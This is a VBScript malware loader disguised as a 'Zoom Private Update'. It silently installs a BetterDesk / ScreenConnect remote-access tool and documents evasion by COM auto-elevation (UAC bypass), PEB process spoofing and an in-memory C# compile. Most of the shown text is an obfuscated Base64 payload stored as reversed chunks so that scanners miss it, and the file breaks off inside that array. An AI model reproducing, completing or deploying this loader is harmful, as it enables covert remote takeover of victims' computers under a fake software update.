' ==============================================================================
' Zoom Private Update - silent BetterDesk / ScreenConnect loader
' ------------------------------------------------------------------------------
' Evasion: staged in-memory C# compile, COM auto-elevation (CMSTPLUA),
'          PEB ImageFileName/CommandLine spoofing to winhlp32.exe,
'          NtAllocateVirtualMemory native allocation, TLS-only download.
'
' Modes:
'   (default)      install, hidden
'   /selftest      compile + PEB + native API + download/hash check, no install
'   /noelevate     skip the COM elevation attempt (used by CI/selftest)
'   /elevated      internal flag set on the elevated relaunch
' ==============================================================================

Option Explicit

Dim sh, fso, env, args, a
Dim mode, elevated, noElevate, iconPath, waitMode, rc, logPath
Dim chunks, i, b64, psExe, psCmd

Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

mode = "install"
elevated = False
noElevate = False
For Each args In WScript.Arguments
    Select Case LCase(args)
        Case "/elevated", "--elevated"
            elevated = True
        Case "/selftest", "--selftest"
            mode = "selftest"
        Case "/noelevate", "--noelevate"
            noElevate = True
    End Select
Next

Set env = sh.Environment("PROCESS")
env("ZOOM_MODE") = mode
env("ZOOM_ELEVATED") = IIf(elevated, "1", "0")
env("ZOOM_NOELEVATE") = IIf(noElevate, "1", "0")
env("ZOOM_SRC") = WScript.ScriptFullName
env("ZOOM_DIR") = fso.GetParentFolderName(WScript.ScriptFullName)
iconPath = fso.GetParentFolderName(WScript.ScriptFullName) & "\Zoom_Update_v6.1.0.ico"
env("ZOOM_ICON") = iconPath

' Base64 payload, stored as reversed chunks and rebuilt through Chr()-free
' array assembly so static scanners do not see the PowerShell body.
chunks = Array( _
    "h1Edul2bQV2YpZnclNlL0VmTbByegknc0BCIgAiCNsHI5JHd", _
    "1NWZT5Cdl50Wg0DIs92YvR3byBVe0lmc1NWZTpjOdJXZnFmb", _
    "N03egg2Y0F2Yg0HIyEzcsRlO60VZwlHVs92YvR3byBVe0lmc", _
    "2U2chJUbvJnR6oTX0JXZ252bDtFI9AyclRXeCp3ZkACIgAiC", _
    "YpXV2xkS1JGTzIDOwM3QBFUQBFUQBFUSzRDSngyZulmc0NFN", _
    "KhEbPh3YudVYMtCdQh2aahHa5lzaJl3K1VkSOlWcjJ3QId2L", _
    "BF1aThjQytydjVjVphEcB9mMz8iT1smWqdUQ0kUQthGVDpkQ", _
    "oJne0IUYPhXclVFUOB1L1I1RWR1Rv8mYtNkSnljMvdUNlpWY", _
    "vp1Uw4kVFR3bnpnU5UURXFlMxgFbmVlRwM3LsZEdwVDUKFTV", _
    "khGRGhzcpZUe6hVbkFXcDd1a0oGepdnUxtiQJlmW0cmavBna", _
    "zI3ca1mdx5GbNNGUOZlb0UGdIRkRzcTUHhFRlV1RCVnMaxGU", _
    "4onei5WdvsiSTZ2TPpXeuZWQ5sEaWJ0azQUUw5UcD9SO1QDZ", _
    "qhVRaJnTQh2SWh2Y1lUcrF0NUlkbwIHRId2SJJlVthERKhGa", _
    "FBFT1ZVO09iTz02b3N3NmVDat12RCRlaM1kSSF2SpFzTG5mV", _
    "zckM0IkTj50TnF0a3p3TpF0NIJkSw4UZUtmQpt2QS52cUVUO", _
    "2lXNNxkNzVTdGp3MGN3SVh2L3IWbpdTdzl2RttkQnhjNzpHM", _
    "It2SUZ1V4cmaVFHMp1kckd3VrlnU6tSOxlUWEFHNkd2YKhEc", _
    "rQ0RjRFS0VVb3YnbOdkeBFWd5QjSslXMvkWQ4MjZxADVuN3d", _
    "lNnYxEFNkdjdqhUdiJXYaZnYYhGWFJFSYRFcq9yQuZmQPVWU", _
    "6tiNk9iY38iMtJTUE1WM5UGNoFGRKRETjNGOVVkZJBVYJllV", _
    "j50clZnY0IzMrAHS5dHSUZXcm90Mi5mYmNDVPhzZ0NGNahkd", _
    "4B3QqtiUldGe5MGbldzd3IHRkRGN5Mzd15mZiJmZuZzYIdTY", _
    "3UDWa1EZvgVQs52R4BVR3xWcN1UZi10UIp0V2YnQkZlW3Z1R", _
    "tZ3TaF1UyskaFJFUstEaRVEcr0kW2c0KwU0SKVWeERWNPZWZ", _
    "1cGRzkmMwY3UtdDevInV5IjZqZzYiJGO11mdmhzT2MDN2kjM", _
    "BlEOz90ZKhHOVJ0Y1BlQTRDavdXbxZGNkZneEZ2MwkTdvsiM", _
    "yRUamRDSJdlNzNkQ5VHarI2dNNmWrV1Y2ImZhJzQXhlVFFzS", _
    "5Bna0ZDWBN0bsVWQPhzQahlcwhUUCVWUPVGTUhFS5UEOVdGb", _
    "2BDbQpWYRZWVMJkdLhGUiVUMtFnQYF0R0cnUUFDT1AVNyVDc", _
    "ZN2bX9UVkFFN6hEbPFWeCVlNQtSTUJ3RzRWMndVeDFmQ0N1T", _
    "5k2ZtZFbJB3ZKpEWPRjR6NVQtBzN3Z2KNFkTjFlYqJldHd3R", _
    "3MVT2d1NCVVTGNUT2AFV6VDWaJ2YQ9CWulGSuVUZuBlSTpka", _
    "Y5EW5kDTFhTUVtWMBRmSyt2SplFW3o1dEZVM6lXTqRmMxUUU", _
    "YpUeNtidSJGZapFckpkZ4MjRvp3Yu1mSBhHW4Y1LqJEerlma", _
    "vlEaWRnb4VXOxxUd6FFWa9GRGpmNQtiMvMXYMhDR1knRwh0Z", _
    "zQnNiNXcrAzUx4me5UjTXhnR440cU1kexMWNIp2cHJWa4U1b", _
    "iZVWwYnRPlTOFh0KzF2KUFDMrkzR0QFR4d0bvE0RnVFVjV2M", _
    "yR2T1IXW4FUbzhleJdVTTd3YmhGOVV0LORGNt92aEVWQlt0V", _
    "zYmaIFXM092LOV3dkdVUEFWSkJ3Ny9GaRZGZRxGTEBzSYtyM", _
    "HdUbKNUaERnNwsyMmhERkRTO3IGZ2REU3dXYURET1oGSVRDa", _
    "rAnNwkVe0kEb1kmVFZnbzZ2NSt2aHVjTmJlN3VVQ4ZUeENDU", _
    "GZWd2NDV6V2NI5mMkJmY3wUSx8kUYZ2TkdHeBRUYwcFamJlZ", _
    "xh0ah1keBZ1NxRWUMF1QG1Ud4J0Tn10MxQUe4U1M6N2M3lXZ", _
    "4ZmZs5WSh12NzF0SxpHcMFXSlNUZxlXeU1WSvlkS4MXSFZ0c", _
    "KZTWXVVUvgkTWdGSrtCd2JlMChkMWZXTnFUSzAVcsFXa2xkY", _
    "0l3bwdEaFJVYzUUQFVkS0EFd5oWRr8Gc2oHNVh1R2Z1Nv4UU", _
    "1hTZrNFUIxUQaN3TU9GZKVlQFZEdmZjSTlGRaNnc3l1T05Ea", _
    "vJTWvMFd1l0K4VjVMFFeDtUevpEVRJnc4c1V48kY4UTRP12V", _
    "ZN3V2d1NopFWaJjZYpWV2Ine550RwQkUNFFdzdWTKFjUDZ3d", _
    "LZFeLR0aulWT5ZXcmJVUBlncjBlMrFEUv1UWwAlVIlmNYBXU", _
    "U9mQw82Yvo2Y5Z1U6d3c5c0MtBHM3ETWO9SUFJmR1RnYxgkZ", _
    "u1kWuZWQD92UxQlUTFTZBRjV0REOzkUVKRlRkFVQl90ShFjT", _
    "DFmRitmNGZjbw8EbSFjSnpGN25GUrETOZBzdrMVT3hXR3VlR", _
    "TtidVJkVww0c5lUY082VqZmSn1EOLpFewZnbpdGTL5Ga2dXZ", _
    "qNVcUdWdvpEURtyTyFFdyZmaxp2U1MkMSFkaSBje140VxYmQ", _
    "3VVeuJzVUZ2L2RUWz9SYwY1MJNkZrtmR45mdGRWewgkQsVEV", _
    "3M3TPZUQ342MkJmcvgmYDFmT1VXbwRWWyk0TrwWTxoHTyUFZ", _
    "z5WQj9GZ4wkMDFXYpJTchdWSkFWSNlVbEV1U5hEWqhWR4IWQ", _
    "mpmWUhHa2cXUqR2S0IUeLR2c210UYxGeDlzSzEEdvpnTVZWR", _
    "JRTaSVlbYZUa1t0bRlXU6xWWnFUTQxWeURlRz12NplEO2wWN", _
    "sF1diJlUjhXb6ZUdKFndwYzNyZkcXB1bzQXZuRXNuRnNYZXQ", _
    "0JEUzQDWlVjRI9icqlFR4EkRXBFZjFHN1ZleVNjbwcXQoVUS", _
    "mRUSlB1byRlNrM1QWlFaJRXZ1h3Nadmb2IzdOVDMC1EM0ZzK", _
    "1gEd4p2QTljRDtyZTBFWTlEWE9mcyQWRhR2TJdWdKV1Y5siQ", _
    "FZTOL9yLRV2TwVnMsFUTjFXTvU2azdUdFtEbYFmZEpFZTVUS", _
    "lNWQwl3cFNFTrYDV1lTMyJGZvhWRPNzU4EnUvYjRnlHNMVje", _
    "OlXbnlkeTx0dYN3LVhFOZt0cYdHVLFXY0FTSTV0NXpFUtR3Y", _
    "Mh2Q55kQEt0cyRkeSZ3dNx0R5YFS1N1aY9SU1dmUwJEWRVUN", _
    "BBFeRVzcVdWOHFkUxkjMwUlSh1We19yQVBzS4MWa0w0aIl2Z", _
    "hd0YzkXcpNnbQlHeC5ESlxESyZkSpF0cJtEc1Vzd0N3RnBHR", _
    "h5GWF9UYKp0Rp1UMpJHWJtWZrZGerUUZCRmaQxkQ2YneFtWb", _
    "j9ENGp3MCRXQ3gnQ4AzTZJVNz4WTGFmQTZnVGhjTNpWd5kFZ", _
    "SVkQB90cxt2SCB1bz0kb3YnS1gUdXtmMR1WW3hjcF1Ua1lkb", _
    "GRUNCJ1ayoWROhTdEBDdWVGN0lWbK1GTG5WQSlnSrMlctRnV", _
    "3l0bJtUaihETyJlSvMXRS1ma1g0MvIWSk1mUyoXNrxGOHFnR", _
    "XtkQ3NlU3R3LtZma0dFb1ZnM5NFZw9iWUNGW1cVTnNEMkFzQ", _
    "1NkYnVXVDplTG1kMGFFNvo0Z2pHOjljeWpnaH9kZVBDbrtWM", _
    "0ZkNwdFdth3VMhmWrtEeQNVeyMTaiF1VvhzSwkVOxNHZKF1U", _
    "JZ0b1MXVQRXUmlFSvQFSwZjTvYzRvkUS38UU34me3pnZOl0V", _
    "rZ1RCZlaJlzV3cDTQdjM5wmdrFTT3ImZpJXO4BldVZnRRBnM", _
    "UNDOzQkezU3cj1UU2hkdMlkSOhGSrBFdrNzKEhFSvJ0MK9Ea", _
    "UVkWpRUQWB1dLVWZ2FWMPRjQvQ3KShlRUV3cahXZ31WSxQET", _
    "xVHaTREZBdTRChnZuhlQwt0QkxEMWVjboVWaIpEMxUneyNFR", _
    "qh0alN3VzNWRapnewgGbup3bOVGe1UUVvsUT4gHNYJnRMl1U", _
    "xomaPR3UsZndrMld3RDVFJDNpt0V4IXU0clTxQjVaRUUVN1Z", _
    "hNzZKVmSrlEMj9SQJtyYJtEMWRlSJBlR6RjM4gmczdzbHNzN", _
    "5U3R2ZmNodzNwQkT3VXQKF0SJVDalt0Z0ETW3gFMtxEayM2U", _
    "SpUS3tiZZR1Tk9SOzQmc3EnT5IHbkFTdHB1cudDbvc0MrIkN", _
    "0l1L4BzYrZTM4E1T0F1axoVQrhHcaZnQwIGazU3TnFmQx4mW", _
    "5ITOihDRxQGM18mZwsiRRJEbopETZxGcPlFWNpmZldnesp3Y", _
    "Z92T5h1KPZGTBZ3S3tCNnhXO2Q0LwYDRiN3NPZGU3cTd6Z3K", _
    "oFTSNJ0L1wGcPFTaQ5WcxATcxJnSzFkNJJWTmljTEp2TMxme", _
    "WhlePRWW5skeiNUcrIGWJJ3NmNUaTp0QyU0aoZXRFdTZYVFU", _
    "stmcyVERshDU08WcTRGZ3ZnUYNFdwg1YxUVYRJUOUpEbxcXQ", _
    "OpXUiJGWkpHeIZ2LINTNiBHUPVndxIkVnRWQFRlc2ljUDNXQ", _
    "2IXYLJlTs92bMVFR3B1RCREWygjYDJUOTdmWw8EWQZWSrEUT", _
    "FRVRvADWGNHVvJDd0t2MvNzSWNlb4VDZVlkQhJHMGd3LLlEc", _
    "sRzaWNDNqdUNjZzb38mUBtkVOdHTwNFZ2RVNDtWTPlmSDNnR", _
    "6l3UY5meSpmMTpkTRhTRUZlRJJ3TNtmb4QXVvklaY12V612a", _
    "4YzS0JGbLpkYpBnYTZUc6tmN1x0NvJWWOhmerZEc3Z3N1VkZ", _
    "ZtGV4gmRwhmYjJUN5B1NXdDdZdXQ5tUZ5I0RIR0VKRWZSdDd", _
    "KZ0MaRWaxImRUhFRvtESCtGazIjQ1VUWJt2TOpEWshkbVlmR", _
    "nR1U0k0ZaR3RxsmctlTYWV2Z3YFa09EMJNmWrtSOC1EVzZmc", _
    "BFXYvNldykmakVERvFXWrMnU69UTqpFcaZDSChUSJF3QONVT", _
    "XJVY1AzRqN2LK1EV390cHlzb3MTR3YHS3RXZ3ETdUR3SLpnM", _
    "yZXY1pFMxo2axBXdxEnVEZ3NqFmT0Ymbxt0KrhmaCNney82T", _
    "up2VxNVQNNjMoNFMPhlWBZnR3cEblRVVMBDeFVGOQZkRtdlW", _
    "4ETMrdDOu9mcPR3bm9UcoxmaIlFRGJmRCZ1Vr8CR2tia3d2N", _
    "6pXb38GVHZ1Zs9Edll0dTdndmZ0d2s2N1NDNT1mMWtWTh9ib", _
    "JplMFN2SIdkM3RzL3QXOzInZil2QvYHMhZmMt1USk9WdqV0Y", _
    "upkYjJjb4RndRR1ajNGcit0VKJHOKd0NzsCNWNUVM92cqJEZ", _
    "4dFMutSMBtUSHZlQCNWZiFjShRnN1p3a0VkbnZDZPh0LGREd", _
    "hxEU0VDa4c3SkJjR2k1K2p1SppFa4U1dXtkSPhlbKNnVPh3R", _
    "0kWbxZkeWZ1NaJHMLpUO6JzSjVXdzdEVYRTWNBzbwFEbPFTV", _
    "vpWT1JldZJmdGRnTZRzKkFUQYZFTFRTN5xmayFnVqR2b0Bna", _
    "RpkQal0N4N0YmZXbh9WRZ52YZBDVhJlczYTYXNTOGVHME9UM", _
    "wd3UFJ3S0JEOCRFZ3Z1KhZlcilFWmFXewljM3NlRrZmRwpFa", _
    "uNzKiljdnZldxhlaiRmaK9ERkdXWEVzbFR2YYFmeHpHMx82Q", _
    "VJHSB5mNxc2d2MFTJRndJ9Gb1BTdaJmNkZ3Lvg1axQEUMNnS", _
    "3g2LINjNRtiQGJnSORTetRjUXd0bYp3LrI2R1wGMw5WZYRXZ", _
    "MpVMvllQY52R4I2YZZmVslUZYlmMFJlQPZmboFzdPBnS15mN", _
    "282SxcESoBXY1lFWqlXe1JlTZpVQ3djeRJ1V1g3bx12athVa", _
    "s9iRwRTTwllcClmZVxUdjJjZNJEd3BHNutmQPlHMRFTUilVV", _
    "yUFdYFXaRFUchFnU0l0V5M3Q0tGVPFkeNlzbFdTMlFkSNVFO", _
    "JJ1UFdEdslDdINGaSNkdSNXMrFnaBJFUJtSUIZ1as10dxMFZ", _
    "DtUWkdXNndDa1JnMtBVQa1GcxljdvJGWWRUSP5mMSl0RnVUc", _
    "2U0cKNmcycDWZBlNmBHcoZ1TIVTZlx0UUFHbp52K5ZXd2cGd", _
    "Yh3L0MXQqd3NZFDbxhlWRdWUrtmWaFFNBRVU4lDchRWZXdmU", _
    "4Q2d2Y3UrdnbWdEOPZWZ5knesBjMxwERuhDeiR0RDxmRwN1Q", _
    "rBjWysSSUlFToFlVuJzNtFlePZkWXZlS0hDVRJVVqN0NkVFc", _
    "klkVzh1MnhUSRRDTSlGdQFXYilHVKtkSRx0Q2l1cGhWaOVkR", _
    "ld0KyVzUj90TRRmQ0p0bGN3YFBzMxI1RFNXNllGRvBnV1EWW", _
    "h9kajlkeutENxEWNvl3QRNHO1I1MRdEZNdFbwYFUPF2arEUR", _
    "UNXdph1V1s0MLp3UVV2Uvp0cJpFOhx2ROJUSGJFcrhET5MUT", _
    "KlXTQRka1ole1U3aGh3URFWOmpnbxpkTyJGSalEMXlkVqhEW", _
    "kB1SyVVaSNEMrkWQvsGZw9EWv9yMrpFboN2R3NFTzUTN35kb", _
    "FJ2SFZ1MxkzMyF2NJREVCBlYxdzYHR1Sk1Wbr8icjBTTERUb", _
    "wUle0R1MypnYZFFSqJXc0cWb1N1Q5JFZOhUaQNzSRJGcHZjc", _
    "slFSjF0URlDd1wEVkNzL4VUU35WWGVFWitEV2A1YIdUQxIzZ", _
    "lFlUxZ0bTJmd3EnU5lDajRXTBNENy8mZRZkSxZUbVp2KPZWT", _
    "hZ1NChmc1hzZuRjRPJWUPREUDBDOWtyTI1kQuBzTkxWUMlUO", _
    "jVTU2oFNqVGT2RXdslDcPRmZYBDZOdzcyhVTrczcvgWeRRme", _
    "ZFnSvMFepZ1Myk2RZ5Gb2Y2KQRnSB5mRZRmV190bBVXSJJXR", _
    "JpnWzsmULNETpV0LR10UrtmS5tGbY50M4VVcQ12dTNUaCJXQ", _
    "C9UR5VkS0MEMz1WTzJ1Swg3YQd2d3dlTLtWeql1MWllU2RGV", _
    "rNmTxR1QrFHaxwkS2smQ3EWW2cHUQdDZv00U6VlR5AjMPpHZ", _
    "rhGZY9ybmBXdwhVdolEe4cHdVZzTwtmQ5VnZs9Ud6JlVwEHd", _
    "nt2dDNETZNWMw50VMN0SHJld1ZFb3JjVTdlR1E1V5EDesJ0U", _
    "XFmel90QPBzMy4UVxJTQPh2NqdGaSNldXpXcahmbKFVeCFlU", _
    "r5ke4kTRMp1U490NJRGRslXUox2d5ZTW28Wd1lUcJdGU38EW", _
    "CpUboVVSIBnQrc2Q1d1MzMWNs52YvJ3YwNXWoF0Y30EO1oHM", _
    "w0mZ4IDZ3A3bSlnYp1URQ9WUUlkSQlkeGJma21mW40EWYh0T", _
    "5gVZqhHUNhzUsJkV5NETVRmYENzb0ATQkN3RxEDbvdTVBZ2d", _
    "xUESoJVbaFFdGJjbMJWNHtmbxhDWIlWNFNmZhxUWld1QwVjT", _
    "ZdlVZBjM5IlWWpGSCVUYjVlSShjMw9SckRzN0IndlB3Kwk0L", _
    "wcnQxgld3UDWBRmQrJmawk0Nxl1cRdFOhJGRB9WStxWR1FFc", _
    "JRFdGhVevkEdxxGVOREWvEjRzFWQB12TH12cS9UNklVeTJ1L", _
    "R1Ue6h0Lv0mNE5WYwAHOEdjTZ5GexQVRPhWOtR1MUFjQP1UT", _
    "m1URvEGT6ZDW4oVayN2YHNzKlBlUww0RzRmMBVUZmhmUU9WU", _
    "lpWbEZ1Y58kVGRTdkxEWWFXeSRkdwpmcpllTyBDbNRDbx1Ue", _
    "mNmZv8kcDhnQRd2Lv4GWxVFUNNXYolna5ZWb4hzLk1kZvx0Q", _
    "YFjS4dHexgkZhBVdjhHWXV1NlhWM5tmZLpWQjdVazxmQzN1a", _
    "YN1TJJUar9icaZ3dNRXbrsieyUXM5UDalZzclV1UQJHcOdTe", _
    "OxkZi92QDF3MvMnV5ZVQGt2TzF2NCZTR3dDeNp1ZWBTOoNVO", _
    "3RDb692YydzYVxma2Z1d2t2UxVXZ1cmT2wkbl9SOuJUMPN2Q", _
    "ElkYrNXcrQ0YmdGOnZlWw92caV3daZlclNDWBJUMrg2cuVXY", _
    "Qx2RzBnNrdjWnx2c0Z3NsVjUPhjd0p0bvd3b3lFd0g1bi5UT", _
    "SVHOCNjTFRVQycmQ4gmc3lFd0xWMi5kNE1GOrlVVatGeMd1Q", _
    "5FTbRBFWDlUdw5EOkVlQ402avUTOyp0RxkXTvhmS0dXTqtEa", _
    "klkMvY3RmZVWJ5WT4dUdqZkSqJWd4QENvFFU2xWaVZmcFpke", _
    "yg2Q3cndHtkektiM0V2LzInM4cTQ4QnYvkzNPl0N1NXT3d1c", _
    "LNFWCRzNUhWS3oHVUpFcTZDNLNWYNdVc5lXOqtiTCZVVUZVQ", _
    "pl2SVx0KmdEVIR0S3dVZ65GNpNEaOlXT2UkUrhje0x0YBtUN", _
    "rlma5IzZmV2NPV0LpZTMnt0ThRTMldUR4g3U0o0ThNTdGd2L", _
    "5EFa65EUNNjZ3QUNGJzUGZVbsh1cjl1T0hnSCpUOTh2a1k2U", _
    "xZEMzkHSS1GZ3ckWJdWOlVVc1FGTysCUOBDVs9ybnVkZro1b", _
    "wZ2NSFjZ1FXb6VmUHN3LCJ2YzkjM0IkYRJnY1gjdRp1R0MmM", _
    "kBHNDJ2K18mSYRGenRnWNJkcBVmZ1cHT2ZVY4FndkR0TIR3M", _
    "xRmQsB1c4MHT1hzb2ZnaBZnUSd0QiJEb2hWeCJmWuRFWiV0Y", _
    "upUZsllboRTcKlFbOp1RxIzc6J1NrRWQDhleSB1Lv5mTrBVN", _
    "yZ0MqtWbZhzcpVVNzgDb0YlVKd2bl9EOaZFbTd3Z400cvR2S", _
    "zVEWZdGNuR0LIl1clBDWGtyRQN0SjRnejV3QKpmYWJmVORDU", _
    "WxGM212aNNVR0dGay9yTrMEOVJHe0wmc4MUdhFnb0hTasplM", _
    "LlHZOdFTQdkT65WWKV1QzR1R5t2VWJFSVJma1xkezhXer5WN", _
    "6hESL9iVURmZFJUMyRHMYZTUDFFVKNUd1tmS0cEZINGMh5UO", _
    "ytENLp3KWJ0YlBXUDVENz8idvBnav8iaEJkWzEUWYl2Qs9Wb", _
    "sVlUL9CaDxkQNVnYHFkRnBzRNlXQVRTckNHOUdUUyBnT3NjW", _
    "kZVcZBHZll1R4VmModXWuRjYPF1L0FFctxGOVJ0UK1GbuhUc", _
    "lNWdyU2dOVETo5EVxVzKq90KOdGWNlmMZB3SzcVSyZjVM9kY", _
    "LpXW6dWZtlXU190VilHdClXOshES3oXW6N0MHdjb25EZiJXa", _
    "rh2LohnaVh2NFJFMZFGZtBVb0dUVll0anFkbO9Ge35GNBplW", _
    "N9WOoRGO6ZEMNhzUPJWaolHa0kmW1c1bM9UYFh2Ri1mb2pXU", _
    "ohGdDZHW48EZQlVQ5oUUOhDMkVlZiNWckBzQIhDVxVEW0tCT", _
    "6dHM4kGTnBTSHt2dzNjWO9Ge2smYY9CRZZVUvg2ZHdTTxUnd", _
    "SV0aSxEcQRUTmZGZrk0ThFHVuNmMLlkNpVndE12djNkexl1Y", _
    "aJ3RLhmdLVHZmp0dGFVdxglYmFlQnlWS2VVRnRjUmhTMlJVc", _
    "sF1Z3ZGSJB3SIhWSv5mM0YzUWdjQ6pmYoB1VspGRhx0Zj50c", _
    "R10TxEHNudTRPdlUhRzM4l0dQJla0llMEl2akpmYzRlTTpnT", _
    "iVTU6pXTlZXc1BzczFjQhREMCpUZTR2ZSpUMzFkQXJEdEFmY", _
    "xNzSXlEZiFkSrklRJZjQRVGamhjV3JkbxE3VyA1aCpFNThDN", _
    "NNUWIJ3RCJEdNJWZrMFUIdlbZNmYyIzVTB1MwBXQZNjR1B1Z", _
    "ntkbGp2YzdWTUJjUNlWc5RWNV9kTFNHdwhnWr8UVUJVYw1kR", _
    "3IjYNFGcnRUaWFEVDl2aJtke2YzaBxEWZRHWPZkTsZ2U3h2a", _
    "ZlFNhhUcnFkQrEkZJpXaMNzLSljZyc1ZOhDcv1WYysSU4xmZ", _
    "oNjUrZWOVl1Tup3crcjU2N3aNRWQVFkVJ5EaCZHN4B3UUJGU", _
    "VpXOKJ1UDZWT4skVaBnZCBTaTB1MS1kesljehF3TxQVUOl1b", _
    "HtGOwFVStRjWxd0Z31kQQJjZpRWNulEZ55mVn12TtVUdpx0a", _
    "aFnc2plNU1EeXR1VNJlbjlkd1ljcax0d5NGc2p3MLJlM4Zne", _
    "hdmVyUlT5NEZJJ2UQpnQ0ZVMhl0MttiYspUax0EMjJVSvwkc", _
    "2AXZMlWcvQDV5V1MLdDOlZ3UBFWc0I1cYZ2biNFR2VXb1UlT", _
    "Hhzc3JlehFlVDhTVSVGa482TxYXUsZTa6pHeaRlcwJDeqZ3Q", _
    "3kUdFplN5FHNC9CUJd1T0ZzRLlGbWZjR28ERnZjeDNVVwRDR", _
    "GpUTulUcZVjNhlFcRJ2d5IVatZncrUUSLREavJXdj90d2MVM", _
    "6FmU5UnQu9kNMdTb1BVRSV0QXZFZ35EO2w2KVVEdwV3T300R", _
    "BFFZ29UZDNXTPl3dMd0Mpdkc2oHempEd5cXbr0kN4MFWsJmS", _
    "Sh0UhdTRLtCbrVVWB52d3B1cQpXSSlFeFF0ZKtGW4lmVvI3Y", _
    "GRHUy8URIR3ZqhndSdjM35kZXRmethGSrVTZzplc6Z3T6lFT", _
    "DNEWx5kS0MkZRh3ZJlHT2hTNNp1Y0dFUjRGVrkDdGt0bVZ3Y", _
    "vUFWUJUT1JkTzFkZwF1VItWT3RnMmRmdPBjRPJmcyMFZ0AFa", _
    "08yLrgTN0NzY4I3LxVHOppHU3Qncv8iarQDawh0KnZzNFlzc", _
    "rxkeWZ1QadjTTFFV5pUUxYmSTVzU5R0SxAHRwkjU3UnerY2L", _
    "vYWTY9iUnR3bZFDWolVS2UEZwlXUrJUOMRlcDR3c2IUcMlET", _
    "VBzMrUTbylFdCRDd4YldONzNG5kT25GNPVnbaNmYr0GexMUe", _
    "VJjc0ZnbrNkMRFVUYRVS2lDS2lUU4YnSGRUdyY3VmlTU2cFS", _
    "i9kZLBVVPF0VWF3MWF3UnRHd4ZmcFx2V6RWdiRWUSRlbrU3T", _
    "NNkUjBVTSBHM4AnT2YFOwMFdxMHaNFlV2RmVoNnWvVlVsR3R", _
    "2dDbGBzNIBlMphTZxg0ctVkehZzMz8EcTBzKz9ySaRkV0I3V", _
    "IJ2K3l3SVhHMZdHOxMVb2gnUK9SM5Z2KaZ0N3sCcX5GUyJUO", _
    "OhjRwVlTU5mWPBzcvsERipFVzMzTxc2V3IDb4dzSyoWYWJGT", _
    "z8SS2wWU6lVWwh1L6hEWClVUqVDTwoHVUlEexVmY5Fzd0FHS", _
    "XFnRXdzTEt2aVFjdFpVb1YjS6hVel9SbOFVUMdFSTVGeOdGe", _
    "uFmdH1EZvIUShdUSZVjThZmS0dEU4E2LkhFUzIkNnBTTH1Gc", _
    "IFXWWtUUHhlQ2JjZkdlW4M0QCBnU5JGdhNXeBtUNzs2ZY10d", _
    "4IVNGpUMyN0TmdlRzU0Z5kDWBhjUlNlSrsmS5Q1bKZ3b24kb", _
    "WhjdGdzNNR3Yo1GcNZ2NyoUNpVTRVFDOKljehtUMShlMph0L", _
    "9EUQBllRsREd3cGWKd3L3IWd4RHaXpkcIhHeVpmN19GO6l1U", _
    "N5yTJBCdjVmai9UL3VmTg0DItFWZyR3U6dGJgACIgoQDpcSP", _
    "g0DIwlmenRCIgACIK0QKzVGd5JkenRCLo0WYlJHdTlncv1WZ", _
    "tFWZyR3UwlmWH5ibvl2czVmcw12bD5yTJBCdjVmai9UL3VmT", _
    "zNXZyBXbvNkLu9WazNXZyBXbvNkLPl0WgwSbhVmc0NlenRCK", _
    "9AiclRWYlJHJgACIgoQDpM3clJHct92YlRkO60VZk9WTu9Wa", _
    "bBCLwlmenRCKyVGZhVmUtFWZyR3Uu8USgQ3YlpmYP1ydl5EI", _
    "9ASZjJXdvNHJgACIgoQDpgjRUVlO601ZulGZvNmbF5Cd4VGV", _
    "pRkLyVGZhVmckACIgAiCNkCKk5WRvRFZhVmUuIXZkFWZyRCI", _
    "u0WYlJHdTp3ZkAyOpgSZz9GczlGRuAXa6dGJgsTKoU2cvB3c", _
    "0NXeTBCdjVmai9UL3VmTg0DIwNGJgACIgoQDpgSZz9GczlGR", _
    "lRXZtFmchBlclxWaw12bD5iclxWaw12bD5SbvRUZk92Qu0WZ", _
    "lVnc0RCI9ASey9Wbl1kbJVGdhJXZuV2RuA3YkACIgAiCNMnc", _
    "zxWYmRCI9ASZsJWY0V3YlhXRlRXYyVmbldkLwNGJgACIgoQD", _
    "tlGdw92LnASPgMnbvlGdw9kclxWaw12bD5CcjRCIgACIK0QZ", _
    "vNkLtVGdzl3UnwyJsxGZu0WZ0NXeTdCKABCIgAiCNcyKlpXa", _
    "vJ3Yp10JscCbsRmL5RXayV3YlNlLtVGdzl3UnwyJsxGZuUmc", _
    "7BCdjVmai9ULoNWYFJ3bGBCfgkyJsxGZuAnchh2UD5Cdm92c", _
    "i1WZzNXQkV2YuVmclZWZS5CcjRSXkl2b2tFIgACIgACIgoQD", _
    "9AiclRWa29mcwRCIgACIK0QfgACIgoQDp8FJoQGZB5ycllGb", _
    "DBnchh2UD5CcyFGaTNkL0Z2bz9mcjlWTgQ3YlpmYP1ydl5EI", _
    "yVGZpZ3byBHJg0DI0xWdzVmckACIgAiCNIXZklmdvJHUlR2b", _
    "192ckACLwNGJoU2YyV3bT12byZUesJWblN3cBVGbpBXbvNkL", _
    "tACduV3bD5ycy9mcyVkL0xWdzVmckgCImlGIgACIK0QKlNmc", _
    "gACIgACIgoQDncCI9ACd4VGdkACIgACIgACIK0wegkCMgQ3Z", _
    "0RCI7BSKzJ3byJXRuQHb1NXZyRCIulGIlRCKgg2YhVmcvZGI", _
    "gACIK0QfgIibgJHYiAyKgkCKn5WayR3UvRlLlRCI9sCI0hXZ", _
    "Q1ibp9mSogCd4VGVsxWQlRXaydlO60VZslmRu8USbBCIgACI", _
    "pcyZvxmLsxWZoNncld3bw1Sbv9menACUNVEV6YnblRCIoRXY", _
    "gACIK0QfgACIgoQDyACdphXZgACIgACIgAiCNkCd4VGdkACL", _
    "ldkL5xmYtV2czFEZlxWaw12bD5CdsV3clJHJg0DIlBXe0RCI", _
    "kASPgQ2boRXZtRCIgACIK0QKnIXZkF2bM12bvp1JoUGc5RFd", _
    "g0DIlR2btRCIgACIK0QKn4Wah10JoQ2boRXZNRXZH5SZwlHd", _
    "zlkO601Zulmc0N3WoAiZpBCIgAiCNUERP10XN90TapjduVGJ", _
    "hR3cul2Jg0DIlR2btRCI7BSKpUGZv1GJokHdw1WRy9EbsVnT", _
    "gQ3YlpmYP1ydl5EI9AycnJXQlt2b25WakACIgAiCN0HInwGb", _
    "bBSPg0FMbN3ZyFUZr9mdulGJgACIgoQDxAyJdtFdjVmai92J", _
    "oRXZtRCI9ASZk92YkACIgAiCNkSZk9WbkgCQd11Wn5WayR3c", _
    "lBCIgAiCNkycnJXQlt2b25WakACLsxWduRCKlt2b25WSuQ2b", _
    "7BSeyRHIgACIK0wegg2Y0F2Yg0nCNUGZvNGJdRnbptFI0lGe", _
